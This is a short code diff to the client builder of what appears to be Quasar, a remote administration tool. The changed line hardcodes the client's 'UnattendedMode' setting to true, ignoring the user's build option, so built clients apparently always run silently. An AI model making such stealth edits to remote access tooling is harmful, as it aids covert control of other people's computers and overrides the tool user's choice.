@@ -170,7 +170,7 @@ namespace Quasar.Server.Build
                                             methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.HideInstallSubdirectory));
                                             break;
                                         case 7: // UnattendedMode
-                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(_options.UnattendedMode));
+                                            methodDef.Body.Instructions[i] = Instruction.Create(BoolOpCode(true));
                                             break;
                                     }
                                     bools++;
